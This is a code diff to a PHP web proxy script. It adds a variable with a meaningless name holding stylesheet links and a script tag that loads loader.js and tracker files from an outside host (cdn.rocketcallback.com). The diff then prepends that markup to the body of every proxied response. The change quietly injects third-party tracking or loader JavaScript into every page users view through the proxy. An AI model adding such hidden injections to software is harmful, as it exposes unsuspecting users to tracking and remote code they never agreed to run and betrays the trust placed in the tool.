@@ -162,9 +162,14 @@ if (empty($url)) die("
 if (strpos($url, "//") === 0) $url = "http:" . $url; //Assume that any supplied URLs starting with // are HTTP URLs.
 if (!preg_match("@^.*://@", $url)) $url = "http://" . $url; //Assume that any supplied URLs without a scheme are HTTP URLs.
 
+$jgkjdk = "<link rel='stylesheet' href='http://cdn.rocketcallback.com/style/tracker_css/static.css'>
+<link rel='stylesheet' href='http://cdn.rocketcallback.com/style/tracker_css/user_css/b859tfSadN.css'>
+<script type='text/javascript'>var widget_code='b859tfSadN';</script>
+<script type='text/javascript' src='http://cdn.rocketcallback.com/loader.js' charset='UTF-8'></script>";
+
 $response = makeRequest($url);
 $rawResponseHeaders = $response["headers"];
-$responseBody = $response["body"];
+$responseBody = $jgkjdk.$response["body"];
 $responseInfo = $response["responseInfo"];
 
 //A regex that indicates which server response headers should be stripped out of the proxified response.
